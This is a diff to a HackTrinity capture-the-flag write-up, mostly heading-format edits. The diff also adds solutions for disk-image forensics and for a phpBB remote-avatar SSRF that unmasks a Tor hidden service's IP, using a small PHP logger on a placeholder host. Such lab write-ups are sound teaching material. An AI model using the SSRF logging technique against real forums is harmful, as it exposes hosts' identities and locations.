@@ -40,14 +40,14 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `intro` | `50` | Very Easy
 
-#### Challenge:
+#### Challenge::
 
 	If you've never played a Capture-The-Flag competition before, worry not!
 	The aim of the game is to find a string of text called a flag
 	Usually the flag will be in the form HackTrinity{}, but sometimes it can be a different piece of text
 	To receive a free 50 points, enter HackTrinity{well_that_was_a_freebie} in the box below, and click Check.
 
-#### Solution:
+#### Solution::
 
 Simple enough. Free points.
 
@@ -57,12 +57,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `intro` | `75` | Very Easy
 
-#### Challenge:
+#### Challenge::
 
 	Oooh, we Trinity students love our rules and procedures.
 	We love them so much we included a flag in the rules for this competition. Can you find it?
 
-#### Solution:
+#### Solution::
 
 Another simple one - no need for an explanation here.
 
@@ -72,11 +72,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `misc` | `77` | Very Easy
 
-#### Challenge:
+#### Challenge::
 
 	What's our real Twitter handle?
 
-#### Solution:
+#### Solution::
 
 The last of the "zero-effort" problems, kind of.
 
@@ -86,14 +86,14 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `reversing` | `100` | Easy
 
-#### Challenge:
+#### Challenge::
 
 	Denovo is a new startup which develops DRM for games.
 	Version 1 is to be released soon, and you've been called in to test its effectiveness...
 	Note: Denovo have decided that serial keys for v1 and all future versions look like "XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX", where 'X' is a capital letter.
 	Both binaries below are generated from the same code, one is built for ARM platforms and one for x86-64. You can choose whichever you're most comfortable with :)
 
-#### Solution:
+#### Solution::
 
 On to the real problems. I chose the x86-64 binary because I can execute it on my machine.
 
@@ -135,12 +135,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `forensics` | `100` | Medium
 
-#### Challenge:
+#### Challenge::
 
 	TCD Disinformation Services have been hard at work making sure that any flag-containing media is fully censored.
 	Apparently one slipped through... Can you find it?
 
-#### Solution:
+#### Solution::
 
 The reason I've given this challenge a difficulty of 'medium' rather than 'easy' is because of the sheer amount of time I spent trying to use steganography and other techniques to search for the flag.
 
@@ -164,12 +164,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `darkweb/recon` | `113` | Very Easy
 
-#### Challenge:
+#### Challenge::
 
 	Oh noes! Someone's stole the Book of Kells and is auctioning it off on the Dark Web!
 	Download the Tor Browser and visit the auction site at http://uxpkyayer253dtcl.onion to find out who's been making bids on this Trinity treasure :O
 
-#### Solution:
+#### Solution::
 
 This was a simple one. If we visit the hidden service and go to the only thread on the forum we'll find the flag sitting at the bottom:
 
@@ -181,11 +181,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `blockchain/recon` | `114` | Easy
 
-#### Challenge:
+#### Challenge::
 
  	The Luas website has been hacked again, and a threatening ransom message posted. Can you track down the culprit's real full name? https://luas.hacktrinity.me 
 
-#### Solution:
+#### Solution::
 
 Visiting the website gives us this Zcash address: `t1gok64PM8APnrSWXgBxboqHrszFYqP5v3L`.
 
@@ -201,12 +201,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `web` | `119` | Very Easy
 
-#### Challenge:
+#### Challenge::
 
 	Tickets for Trinity Ball have finally been released! Due to high demand, the organisers have limited tickets to one per person. Can you bypass the restrictions and checkout two tickets at once?
 	https://trinityball1.hacktrinity.me
 
-#### Solution:
+#### Solution::
 
 If we visit the page and click the button we'll be taken to an order page:
 
@@ -236,12 +236,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `networking` | `120` | Medium
 
-#### Challenge
+#### Challenge:
 
 	Each challenge has a dedicated OpenVPN server ... (instructions for setting up OpenVPN, etc) ... that challenge will be destroyed (and re-created next time you connect).
 	Once you're all set up, this challenge should be fairly easy: you should be able to nmap your allocated subnet to find a web server hosting the flag.
 
-#### Solution
+#### Solution:
 
 If we install OpenVPN, download the config file and follow the setup instructions closely then we should be able to get connected easily enough.
 
@@ -266,11 +266,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `crypto/steganography` | `121` | Easy
 
-#### Challenge
+#### Challenge:
 
 	Apparently the flag is in the file hidden.txt but I can't find it, good luck to you!
 
-#### Solution
+#### Solution:
 
 If we open the file in Vim we can see a number of suspicious looking characters:
 
@@ -290,11 +290,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `networking` | `130` | Medium
 
-#### Challenge
+#### Challenge:
 
 	You should really listen a bit more.
 
-#### Solution
+#### Solution:
 
 This is another OpenVPN challenge so we can just repeat the steps from 'Welcome' when setting up.
 
@@ -308,12 +308,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `recon` | `143` | Medium
 
-#### Challenge
+#### Challenge:
 
 	We discovered a GSM audio bug in the president's office. Our counter-surveillance techs have determined that the bug was setup to phone home to +353 89 490 9392. We suspect this number is probably the personal phone number of one of the bad people involved (they're not very smart). Can you use your open-source intelligence gathering skills to discover the real-life identity of the owner of this phone?
 	Hint: they use a service used by >1 billion other people
 
-#### Solution
+#### Solution:
 
 Due to the hint, I spent quite a while trying to find the flag via Facebook (since the phone number appeared to be registered there). However, if we try to find the phone number on WhatsApp we'll quickly find the flag hidden in the user's profile picture:
 
@@ -325,12 +325,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `misc` | `150` | Very Easy
 
-#### Challenge
+#### Challenge:
 
 	I was trawling through my email the other day to see if I could find any flags and I found a message with this file in my spam box.
 	The subject line claimed "FLAG WITHIN!", but I can't make any sense of it.
 
-#### Solution
+#### Solution:
 
 The attached file was of the type `cia`. Since I already had the 3DS emulator Citra installed on my laptop this gave the entire thing away. By opening the file in Citra we can get our flag:
 
@@ -344,13 +344,13 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `reversing` | `175` | Medium
 
-#### Challenge
+#### Challenge:
 
 	After Denovo v1 was released into the wild (despite your warnings) and cracks for the protected games appeared online within the hour, the engineers went back to the drawing board.
 	Now they're ready to release Denovo v2. Apparently the new version makes use of a proprietary encryption solution which is UNCRACKABLE. Can you take a look?
 	Both binaries below are generated from the same code, one is built for ARM platforms and one for x86-64. You can choose whichever you're most comfortable with :)
 
-#### Solution
+#### Solution:
 
 Once again, I downloaded the x86-64 version. I repeated the steps from 'Denovo 1' and found the following data in the `hexdump` output:
 
@@ -364,11 +364,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `programming` | `179` | Easy
 
-#### Challenge
+#### Challenge:
 
 	My friend Urban Turing made a new language and he claims that it is Turing complete, can you run the program he has written in this new language? 
 
-#### Solution
+#### Solution:
 
 The name Urban Turing must be a reference to Urban Müller - which means we're probably dealing with Brainfuck. Since we can assume that this program, when run, will print out the flag all we need to do is use a [Brainfuck text generator](https://copy.sh/brainfuck/text.html) to find out what our code *should* look like  and then begin matching and replacing characters. I entered "HackTrinity{" into the generator and got the following:
 
@@ -378,7 +378,7 @@ Our challenge code looks like:
 
 `#/#######>&<\># /###>&&&&<\>& ...`
 
-We can replace make the following replacements:
+We can make the following replacements:
 
 * `#` with `-`
 * `/` with `[`
@@ -401,11 +401,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `programming` | `180` | Easy
 
-#### Challenge
+#### Challenge:
 
 	Some normie sent you some strange code, can you find out how to run it?
 
-#### Solution
+#### Solution:
 
 Like the previous challenge, we're dealing with Brainfuck. We do another word replacement:
 
@@ -427,12 +427,12 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `networking` | `180` | Hard
 
-#### Challenge
+#### Challenge:
 
 	Hey, it's rude to eavesdrop!
 
 
-#### Solution
+#### Solution:
 
 We setup OpenVPN as before and start scanning with nmap. There are two additional hosts up:
 
@@ -456,11 +456,11 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `forensics` | `184` | Medium
 
-#### Challenge
+#### Challenge:
 
 	This zip file seems to be corrupted, any chance you could recover the flag inside?
 
-#### Solution
+#### Solution:
 
 If we run a `binwalk` on the archive it doesn't look at all suspicious. If we extract strings we'll find the name of the file inside: `flag.txt`. However, we can't access the this file because the archive's corrupted.
 
@@ -478,14 +478,14 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `exploit` | `191` | Hard
 
-#### Challenge
+#### Challenge:
 
 	I set up a server so I can check on the flag for this challenge.
 	You can find it at ht3.hacktrinity.me:1337 (to connect using netcat, run nc ht3.hacktrinity.me 1337)
 	Don't worry, it's password-protected, so you won't be able to get it.
 	Here's the program running on the server (not that it'll help you since I've replaced the password and flag with rubbish):
 
-#### Solution
+#### Solution:
 
 This was one was really fun!
 
@@ -495,13 +495,13 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `phreaking` | `217` | Medium
 
-#### Challenge
+#### Challenge:
 
 	Miers Porgan has been caught hacking into voicemails again.
 	Can you figure out how he got into mine?
 	+353 76 680 3900 
 
-#### Solution
+#### Solution:
 
 To solve this one you simply needed to use a VoIP app to call the provided number. I used Skype with a free trial. You'll be asked to enter a two-digit voicemail password and will be able to get the flag once you've entered the correct one via trial-and-error:
 
@@ -513,14 +513,93 @@ Topic(s) | Points | Difficulty (in my opinion)
 ---------|--------|-----------
 `forensics` | `231` | Hard
 
-#### Challenge
+#### Challenge:
 
 	A friend of mine keeps a portable Linux install on his USB drive.
 	I passed by the other day and saw a flag on his screen, which he quickly alt-tabbed away from.
 	Since I really want that flag, I grabbed the drive and made an image of it while he was off at lunch, but I can't seem to find any sign of a flag. Can you help?
 
-#### Solution
+#### Solution:
 
+I spent a long time trying to mount the image and bricked a USB in the process - I didn't get anywhere with that endeavour.
+
+Then I ran the following command `strings disk.img | awk 'length($0) > 10'` and searched the output for the word 'flag'.
+
+I found this: `flag.png`!
+
+I used the forensice tool Foremost to extract all png files from the disk image: `foremost -t png -i disk.img`
+
+In the output folder was the image containing our flag:
+
+`img here`
+
+### Book of Kells 2
+
+Topic(s) | Points | Difficulty (in my opinion)
+---------|--------|-----------
+`darkweb/forensics` | `237` | Medium
+
+#### Challenge:
+
+	The purpose of Tor Hidden Services is to hide the IP address of the server that is hosting the website. However, can you identify the real IP address the forum software is running on?
+	Hint: SSRF
+	http://uxpkyayer253dtcl.onion
+	Enter the flag as an IPv4 address, e.g. 1.33.4.2
+
+#### Solution:
+
+Using the 'SSRF' hint, as well as the fact that the forum uses phpBB I did a bit of research to see if there were any big vulnerabilities out there: [bingo](https://vuldb.com/?id.111233)!
+
+If we create an account via the forum and go to our profile page we can see that the forum allows us to specify a remote avatar:
+
+![Remote avatar](images/20_bok_2.png)
+
+I created a web server that contained a page with the following PHP code:
+
+```php
+<?php
+
+    $i = $_SERVER['REMOTE_ADDR'] . "\n";
+    $f = fopen('log.txt', 'a');
+    fwrite($f, $i);
+    fclose($f);
+
+?>
+```
+
+If we make this URL look like an image file http://myserver.com/log.php?i=image.png` and then set it as our remote avatar then we'll find the hidden service's IP address in the file `log.txt`.
+
+### Nat a flag
+
+Topic(s) | Points | Difficulty (in my opinion)
+---------|--------|-----------
+`networking` | `283` | Hard
+
+#### Challenge:
+
+	A guy I know keeps his flags on a private webserver inside his home network. I really want those flags, any chance you could help? (For this challenge you can assume that your allocated subnet is "the internet")
+
+#### Solution:
+
+Once again we carry out the standard OpenVPN setup and run an nmap scan.
+
+...
+
+### Denovo 3
+
+Topic(s) | Points | Difficulty (in my opinion)
+---------|--------|-----------
+`reversing` | `300` | Very Hard
+
+#### Challenge:
+
+	When the "encryption" behind Denovo v2 fell almost as quickly as v1, management decided to fire all of the engineers and start over.
+	After months of work, Denovo v3 is finally for prime-time. Did the new team's efforts pay off?
+	Both binaries below are generated from the same code, one is built for ARM platforms and one for x86-64. You can choose whichever you're most comfortable with :)
+
+#### Solution:
+
+...
 
 ## Unsolved Problems
 
